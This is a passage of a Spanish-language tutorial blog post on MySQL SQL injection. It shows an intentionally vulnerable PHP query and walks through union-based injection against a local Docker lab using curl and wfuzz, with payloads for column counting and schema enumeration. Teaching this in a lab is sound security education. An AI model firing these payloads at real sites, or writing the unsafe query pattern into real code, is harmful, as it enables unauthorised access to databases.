<!doctype html><html lang=en data-bs-theme=dark><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-500.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-700.woff2 as=font type=font/woff2 crossorigin><script src=/js/dismissable-alert.ecfe60f33522da00acae2a7c5195ae0237f6bf736d4c295a83700bdbcb4d0263.js integrity="sha256-7P5g8zUi2gCsrip8UZWuAjf2v3NtTClag3AL28tNAmM="></script><link rel=stylesheet href="/main.a9e6da88941721c349f8bb4c26a0b7d43209cbc13e35a7eb19cbd655ebd53db87d0f426eaaa88dbd574786f3ef2fb4a9277b6a0122e1b8077dfd237511a0cd64.css" integrity="sha512-qebaiJQXIcNJ+LtMJqC31DIJy8E+NafrGcvWVevVPbh9D0JuqqiNvVdHhvPvL7SpJ3tqASLhuAd9/SN1EaDNZA==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><link rel=canonical href=/blog/aprende-sqli-mysql/><title>Aprende SQLI (MySQL) | d3bo</title><meta name=description content><meta property="og:title" content="Aprende SQLI (MySQL)"><meta property="og:description" content="Aprende SQLI con ejemplos y contenedores docker para poner en práctica todo lo que vas aprendiendo, a lo largo del post aprenderás 3 típos de SQLI: Basadas en tiempo, Union y Boleanas"><meta property="og:type" content="article"><meta property="og:url" content="/blog/aprende-sqli-mysql/"><meta property="og:image" content="/blog/aprende-sqli-mysql/cover.png"><meta property="article:section" content="blog"><meta property="article:published_time" content="2023-12-19T00:00:00+00:00"><meta property="article:modified_time" content="2024-05-28T00:00:00+00:00"><meta property="og:site_name" content="d3b0o"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/blog/aprende-sqli-mysql/cover.png"><meta name=twitter:title content="Aprende SQLI (MySQL)"><meta name=twitter:description content="Aprende SQLI con ejemplos y contenedores docker para poner en práctica todo lo que vas aprendiendo, a lo largo del post aprenderás 3 típos de SQLI: Basadas en tiempo, Union y Boleanas"><meta name=twitter:site content="@getdoks"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"/","name":"D3bo","position":1},{"@type":"ListItem","item":"/blog/","name":"Blog","position":2},{"@type":"ListItem","name":"Aprende SQL I ( My Sql)","position":3}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","headline":"Aprende SQLI (MySQL)","description":"","isPartOf":{"@id":"/blog/aprende-sqli-mysql/"},"mainEntityOfPage":{"@id":"/blog/aprende-sqli-mysql/"},"datePublished":"2023-12-19T00:00:00+00:00","dateModified":"2024-05-28T00:00:00+00:00","image":[{"@id":"/blog/aprende-sqli-mysql/cover.png"},{"@id":"/blog/aprende-sqli-mysql/images/1.jpg"},{"@id":"/blog/aprende-sqli-mysql/images/2.jpg"},{"@id":"/blog/aprende-sqli-mysql/images/helloworld.png"},{"@id":"/blog/aprende-sqli-mysql/images/interiorruberducky.png"},{"@id":"/blog/aprende-sqli-mysql/images/jsencoder.png"},{"@id":"/blog/aprende-sqli-mysql/images/language.png"},{"@id":"/blog/aprende-sqli-mysql/images/mrrobot.png"},{"@id":"/blog/aprende-sqli-mysql/images/ruberducky-black.jpg"},{"@id":"/blog/aprende-sqli-mysql/images/ruberducky-white.png"},{"@id":"/blog/aprende-sqli-mysql/images/usb.jpg"},{"@id":"/blog/aprende-sqli-mysql/images/wallpaper.png"}],"author":{"@type":"Organization","name":"Hyas","url":"/"},"publisher":{"@type":"Organization","name":"Hyas"}}]}</script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1877012045454778" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-850CS210Y8"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-850CS210Y8")</script></head><body class="single section blog" data-bs-spy=scroll data-bs-target=#toc data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll=true tabindex=0><div id=vanta-bg style=position:absolute;width:100%;height:100%;z-index:-1></div><div id=announcement data-id=global-alert-ed321576fabf52d76f925272710cb364 class="alert alert-primary alert-dismissible fade show text-center" role=alert><span class=alert-text>¡Nuevo writeup de la máquina "<a href=/writeups/hackthebox/unobtainium>Unobtainium</a>" de HackTheBox!</span>
<button type=button class=btn-close data-bs-dismiss=alert aria-label=Close></button></div><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg"><div class=container-lg><a class="navbar-brand me-auto me-lg-3" href=/>d3bo</a>
<button type=button id=searchToggleMobile class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button>
<button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavMain aria-controls=offcanvasNavMain aria-label="Open main navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><line x1="4" y1="8" x2="20" y2="8"/><line x1="4" y1="16" x2="20" y2="16"/></svg></button><div class="offcanvas offcanvas-end h-auto" tabindex=-1 id=offcanvasNavMain aria-labelledby=offcanvasNavMainLabel><div class="header-bar d-lg-none"></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavMainLabel>d3bo</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between"><ul class="navbar-nav flex-grow-1"><li class=nav-item><a class="nav-link active" href=/blog/ aria-current=true>Blog</a></li><li class=nav-item><a class=nav-link href=/writeups/intro/bienvenido/>Writeups</a></li><li class=nav-item><a class=nav-link href=/ctf/intro/bienvenido/>CTF</a></li><li class=nav-item><a class=nav-link href=/archive/>Archive</a></li><li class=nav-item><a class=nav-link href=/about/>About</a></li></ul><button type=button id=searchToggleDesktop class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button><ul id=socialMenu class="nav mx-auto flex-row order-lg-4"><li class=nav-item><a class="nav-link social-link" href=https://x.com/sr_d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4l11.733 16H20L8.267 4z"/><path d="M4 20l6.768-6.768m2.46-2.46L20 4"/></svg><small class="ms-2 visually-hidden">Twitter</small></a></li><li class=nav-item><a class="nav-link social-link" href=https://github.com/d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg><small class="ms-2 visually-hidden">GitHub</small></a></li></ul><a class="btn btn-primary rounded-pill mt-2 btn-block d-lg-none" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></div><a class="btn btn-primary rounded-pill ms-3 me-2 px-4 order-lg-3 d-none d-lg-block" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></header></div><div class=modal id=searchModal tabindex=-1 aria-labelledby=searchModalLabel aria-hidden=true><div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down"><div class=modal-content><div class=modal-header><h1 class="modal-title fs-5 visually-hidden" id=searchModalLabel>Search</h1><button type=button class="btn-close visually-hidden" data-bs-dismiss=modal aria-label=Close></button><div class="search-input flex-grow-1 d-none"><form id=search-form class=search-form action=# method=post accept-charset=utf-8 role=search><label for=query class=visually-hidden>Search</label><div class=d-flex><input type=search id=query name=query class="search-text form-control form-control-lg" placeholder=Search aria-label=Search maxlength=128 autocomplete=off>
<button type=button class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss=modal aria-label=Close>Cancel</button></div></form></div></div><div class=modal-body><p class="search-loading status message d-none mt-3 text-center">Loading search index…</p><p class="search-no-recent message d-none mt-3 text-center">No recent searches</p><p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class=query-no-results>Query here</span></strong>"</p><div id=searchResults class=search-results></div><template><article class="search-result list-view"><div class="card my-3"><div class=card-body><header><h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href=#>Title here</a></h2><div class=submitted><time class=created-date>Date here</time></div></header><div class="content d-none">Summary here</div></div></div></article></template></div><div class=modal-footer><ul class="list-inline me-auto d-none d-md-block"><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd><span class=DocSearch-Label>to select</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd><kbd class=me-2><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd><span class=DocSearch-Label>to navigate</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd><span class=DocSearch-Label>to close</span></li></ul><p class=d-md-none>Search by <a class=text-decoration-none href=https://github.com/nextapps-de/flexsearch>FlexSearch</a></p></div></div></div></div><div class="wrap container-lg" role=document><div class=content><article><div class="row justify-content-center"><div class="col-md-12 col-lg-10"><div class=blog-header><h1>Aprende SQLI (MySQL)</h1><p><small>December 19, 2023&nbsp;in&nbsp;<a class="stretched-link position-relative link-muted" href=/categories/ciberseguridad/>Ciberseguridad</a><span class="stretched-link position-relative reading-time" title="Estimated reading time"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 7v5l3 3"/></svg>24&nbsp;minutes</span></small></p><p style=word-wrap:break-word;overflow-wrap:break-word>Aprende SQLI con ejemplos y contenedores docker para poner en práctica todo lo que vas aprendiendo, a lo largo del post aprenderás 3 típos de SQLI: Basadas en tiempo, Union y Boleanas</p><div class=col-md-13></div><div class=tag-list-single><a class="btn btn-light" href=/tags/sqli/ role=button>SQLI</a>
<a class="btn btn-light" href=/tags/sql/ role=button>SQL</a></div></div></div><div class=col-md-13><picture><source type=image/webp srcset="/blog/aprende-sqli-mysql/cover_hua798e0f497d5f7f366019db0ddc9f72c_849540_3e31ce92bb3d69093af22f7dce636a5d.webp 480w,/blog/aprende-sqli-mysql/cover_hua798e0f497d5f7f366019db0ddc9f72c_849540_114b000c59437414ed270c1930277507.webp 640w,/blog/aprende-sqli-mysql/cover_hua798e0f497d5f7f366019db0ddc9f72c_849540_a12714aa81332b6e4e5bb5f6683f713c.webp 800w,/blog/aprende-sqli-mysql/cover_hua798e0f497d5f7f366019db0ddc9f72c_849540_00efb47c72d9a2064d1b98c426756aed.webp 1024w,/blog/aprende-sqli-mysql/cover_hua798e0f497d5f7f366019db0ddc9f72c_849540_d54cab9d49df45e01d127dcec7ed961a.webp 1600w" sizes=100vw><source type=image/jpeg srcset="/blog/aprende-sqli-mysql/cover_hua798e0f497d5f7f366019db0ddc9f72c_849540_d2aeff3b5cef01eed6eee55f5e1e24e7.jpg 480w,/blog/aprende-sqli-mysql/cover_hua798e0f497d5f7f366019db0ddc9f72c_849540_d32693682e0aafe01367be1a66910368.jpg 640w,/blog/aprende-sqli-mysql/cover_hua798e0f497d5f7f366019db0ddc9f72c_849540_0bdf400c0f9e95b16c01fafd738ce181.jpg 800w,/blog/aprende-sqli-mysql/cover_hua798e0f497d5f7f366019db0ddc9f72c_849540_54a65f42f17f031afe9e28990fa52ac7.jpg 1024w,/blog/aprende-sqli-mysql/cover_hua798e0f497d5f7f366019db0ddc9f72c_849540_31b44a621de5565029e360529b469fb4.jpg 1600w" sizes=100vw><img class="img-fluid w-100 lazyload blur-up img-fluid lazyload blur-up img-post-single rounded-5" src=/blog/aprende-sqli-mysql/cover_hua798e0f497d5f7f366019db0ddc9f72c_849540_cbb06e3ee67112d0666ed80ffe33b0d1.png width=1600 height=900 alt="Aprende SQLI (MySQL)" data-src=/blog/aprende-sqli-mysql/cover_hua798e0f497d5f7f366019db0ddc9f72c_849540_d2aeff3b5cef01eed6eee55f5e1e24e7.jpg loading=lazy></picture></div><div class="col-md-12 col-lg-9"><ul><li><a href=#%C2%BFqu%C3%A9-es-una-sqli>¿Qué es una SQLI?</a></li><li><a href=#mysql>MySQL</a><ul><li><a href=#inyecci%C3%B3n-union>Inyección Union</a><ul><li><a href=#enumeraci%C3%B3n-bases-de-datos>Enumeración bases de datos</a></li><li><a href=#enumeraci%C3%B3n-de-las-tablas>Enumeración de las tablas</a></li><li><a href=#columnas>Columnas</a></li><li><a href=#data>Data</a></li><li><a href=#subida-de-archivos>Subida de archivos</a></li></ul></li><li><a href=#booleana>Booleana</a><ul><li><a href=#base-de-datos>Base de datos</a></li><li><a href=#tablas>Tablas</a></li><li><a href=#columnas>Columnas</a></li><li><a href=#data>Data</a></li><li><a href=#mas-informaci%C3%B3n-relevante>Mas información relevante</a></li></ul></li><li><a href=#basada-en-tiempo-a-ciegas>Basada en tiempo a ciegas</a><ul><li><a href=#base-de-datos>Base de datos</a></li><li><a href=#tables>Tables</a></li><li><a href=#columns>Columns</a></li><li><a href=#data>Data</a></li><li><a href=#mas-informaci%C3%B3n-relevante>Mas información relevante</a></li></ul></li></ul></li></ul><h1 id=qué-es-una-sqli>¿Qué es una SQLI?</h1><p>Como dicen las siglas SQL Injection (Inyección SQL), consiste en inyectar instrucciones SQL dentro de una query SQL, mediante la entrada o modificaciones de datos desde el cliente hacia la aplicación intencionada. Por ejemplo un formulario, un panel de inicio de sesión, comentarios, etc&mldr;</p><p>Vamos a imaginarnos un ejemplo, tenemos una web que nos da la información del usuario que le mandamos por get</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; curl -s <span class=s2>&#34;localhost/index.php?nombre=joan&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nombre: Joan
</span></span><span class=line><span class=cl>Rol: admin
</span></span></code></pre></div><p>Vamos a analizar el código para ver como está hecho.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$nombre</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;nombre&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$query</span> <span class=o>=</span> <span class=s2>&#34;SELECT * FROM mi_tabla WHERE nombre = &#39;</span><span class=si>$nombre</span><span class=s2>&#39;&#34;</span><span class=p>;</span>
</span></span></code></pre></div><p>El servidor web recibe por GET el contenido que se manda por el parámetro nombre y mete directamente nuestro input a la query SQL, sin validar si realmente le estamos pasando un nombre, así que esto lo hace vulnerable a una SQL Injection.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; curl -s <span class=s2>&#34;localhost/index.php?nombre=joan&#39;&#34;</span>
</span></span><span class=line><span class=cl>Error en la consulta: You have an error in your SQL syntax<span class=p>;</span> check the manual that corresponds to your MySQL server version <span class=k>for</span> the right syntax to use near <span class=s1>&#39;&#39;</span>joan<span class=s1>&#39;&#39;</span><span class=err>&#39;</span> at line <span class=m>1</span>
</span></span></code></pre></div><p>Ha saltado un error en la consulta SQL, en el mensaje de error especifican que concretamente ha sido en &lsquo;&lsquo;&lsquo;joan&rsquo;&rsquo;&rsquo;&rsquo;. Esto es porque hemos añadido una comilla la cual nunca se ha cerrado y ha quedado colgada lo que ha causado un error. Así es como a quedado la query con la comilla que hemos añadido.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>mi_tabla</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>nombre</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;joan&#39;&#39;
</span></span></span></code></pre></div><p>Ahora todo lo que pongamos después de la comilla se va a interpretar como instrucciones sql y para que no de problemas la comilla que se queda colgada, la podemos comentar con &lsquo;&ndash; -&rsquo;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>mi_tabla</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>nombre</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;joan&#39;</span><span class=w> </span><span class=n>sleep</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span><span class=w> </span><span class=c1>-- -&#39;
</span></span></span></code></pre></div><p>Para entenderlo mejor, os comparto un ejemplo hecho con python, ya que python es más fácil de entender</p><p>Cuando le ponemos una comilla de más da error</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=n>name</span> <span class=o>=</span> <span class=s2>&#34;Joan&#34;&#34;</span>
</span></span><span class=line><span class=cl>  <span class=n>File</span> <span class=s2>&#34;&lt;stdin&gt;&#34;</span><span class=p>,</span> <span class=n>line</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>name</span> <span class=o>=</span> <span class=s2>&#34;Joan&#34;&#34;</span>
</span></span><span class=line><span class=cl>                 <span class=o>^</span>
</span></span><span class=line><span class=cl><span class=ne>SyntaxError</span><span class=p>:</span> <span class=n>unterminated</span> <span class=n>string</span> <span class=n>literal</span> <span class=p>(</span><span class=n>detected</span> <span class=n>at</span> <span class=n>line</span> <span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></div><p>Si comentamos la comilla ya no da error</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=n>name</span> <span class=o>=</span> <span class=s2>&#34;Joan&#34;</span> <span class=c1>#&#34;</span>
</span></span></code></pre></div><p>Ahora el contenido que pongamos después de la comilla se va a interpretar como instrucciones y no como texto</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=n>name</span> <span class=o>=</span> <span class=s2>&#34;joan&#34;</span><span class=p>;</span> <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Hola&#34;</span><span class=p>)</span> <span class=c1>#&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Hola</span>
</span></span></code></pre></div><h1 id=mysql>MySQL</h1><h2 id=inyección-union>Inyección Union</h2><div class="callout callout-note d-flex flex-row mt-4 mb-4 pt-4 pe-4 pb-2 ps-3"><svg class="info-circle svg-inline callout-icon me-2 mb-3" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 9h.01"/><path d="M11 12h1v4h1"/></svg><div class=callout-content><div class=callout-title><p>Laboratorio</p></div><div class=callout-body><p>Para la explicación se va a usar el laboratorio 1:</p><ul><li><p>Descarga el <a href=labs/lab1.zip>laboratorio</a></p></li><li><p>Descomprímelo y entra a la carpeta</p></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>unzip lab1.zip
</span></span><span class=line><span class=cl><span class=nb>cd</span> lab1
</span></span></code></pre></div><p>Despliega el contenedor</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docker-compose up --build
</span></span></code></pre></div></div></div></div><p>Una vez tenemos localizada la SQL Injection, en el caso del laboratorio 1 es el parámetro <code>nombre</code>, vamos a llevar a cabo el tipo de inyección union.</p><p>Primero de todo necesitamos saber el número de columnas que tiene la tabla que se está usando. Para localizarlas vamos a usar la funcion &lsquo;order&rsquo; la cual nos permite ordenar las columnas basándonos en la columna que le especificamos, si le especificamos un número de columnas que no exista va a dar error, jugando con esto podemos encontrar el número de columnas</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; order by 3-- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>Nombre: Joan
</span></span><span class=line><span class=cl>Rol: admin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                                                                                               
</span></span><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; order by 4-- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>Error en la consulta: Unknown column <span class=s1>&#39;4&#39;</span> in <span class=s1>&#39;order clause&#39;</span>
</span></span></code></pre></div><p>Ahora ya sabemos que la tabla tiene 3 columnas, porque &lsquo;order by 3&rsquo; no da error pero &lsquo;order by 4&rsquo; sí. En el caso de que sea una tabla muy grande podemos usar herramientas para automatizar este paso.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; wfuzz -c -t <span class=m>20</span> -z range,1-5 <span class=s2>&#34;http://localhost/?nombre=joan&#39;+order+by+FUZZ--+-&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>000000001:   <span class=m>200</span>        <span class=m>1</span> L      <span class=m>3</span> W        <span class=m>31</span> Ch       <span class=s2>&#34;1&#34;</span>                                           
</span></span><span class=line><span class=cl>000000003:   <span class=m>200</span>        <span class=m>1</span> L      <span class=m>3</span> W        <span class=m>31</span> Ch       <span class=s2>&#34;3&#34;</span>                                           
</span></span><span class=line><span class=cl>000000002:   <span class=m>200</span>        <span class=m>1</span> L      <span class=m>3</span> W        <span class=m>31</span> Ch       <span class=s2>&#34;2&#34;</span>                                           
</span></span><span class=line><span class=cl>000000004:   <span class=m>200</span>        <span class=m>0</span> L      <span class=m>10</span> W       <span class=m>58</span> Ch       <span class=s2>&#34;4&#34;</span>                                           
</span></span><span class=line><span class=cl>000000005:   <span class=m>200</span>        <span class=m>0</span> L      <span class=m>10</span> W       <span class=m>58</span> Ch       <span class=s2>&#34;5&#34;</span> 
</span></span></code></pre></div><p>Vemos que cuando el número de columna ya no existe cambia el tamaño de la respuesta.</p><p>Ya tenemos el número de columnas así que podemos empezar a usar union para concatenar datos. El payload es el siguiente</p><pre tabindex=0><code>union select NULL,NULL,NULL-- -
</code></pre><p>Hay que poner tantos NULL como columnas tenga la tabla.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; union select NULL,NULL,NULL-- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nombre: Joan
</span></span><span class=line><span class=cl>Rol: admin
</span></span><span class=line><span class=cl>Nombre: 
</span></span><span class=line><span class=cl>Rol: 
</span></span></code></pre></div><p>Ahora podemos sustituir los NULL por cadenas de texto para comprobar en que columnas podemos mostrar datos</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; union select &#39;a&#39;,&#39;b&#39;,&#39;c&#39;-- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nombre: Joan
</span></span><span class=line><span class=cl>Rol: admin
</span></span><span class=line><span class=cl>Nombre: b
</span></span><span class=line><span class=cl>Rol: c
</span></span></code></pre></div><p>Sabemos que podemos ver los datos de las columnas 2 y 3.</p><h3 id=enumeración-bases-de-datos>Enumeración bases de datos</h3><p>Para saber que bases de datos existen usaremos el siguiente payload</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>NULL</span><span class=p>,</span><span class=k>schema_name</span><span class=p>,</span><span class=k>NULL</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>informationschema</span><span class=p>.</span><span class=n>schemata</span><span class=c1>-- -
</span></span></span></code></pre></div><p>Que significa <code>schema_name</code>, <code>information_schema</code> y <code>schemata</code>?, para saberlo vamos a mirar la base de datos del contenedor sql. Para encontrar el identificador del contenedor hay que ejecutar <code>sudo docker ps</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; sudo docker ps
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>CONTAINER ID   IMAGE            COMMAND                  CREATED        STATUS         PORTS                                                  NAMES
</span></span><span class=line><span class=cl>52e31603f6a9   php:7.4-apache   <span class=s2>&#34;docker-php-entrypoi…&#34;</span>   <span class=m>13</span> hours ago   Up <span class=m>8</span> minutes   0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp                      lab1_web_1
</span></span><span class=line><span class=cl>d71dbadbe4d0   mysql:5.7        <span class=s2>&#34;docker-entrypoint.s…&#34;</span>   <span class=m>13</span> hours ago   Up <span class=m>8</span> minutes   0.0.0.0:3306-&gt;3306/tcp, :::3306-&gt;3306/tcp, 33060/tcp   lab1_db_1
</span></span></code></pre></div><p>Ahora ya tenemos el id y podemos ejecutar una bash en el contenedor, y después entrar a mysql.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; sudo docker <span class=nb>exec</span> -it d71dbadbe4d0 bash
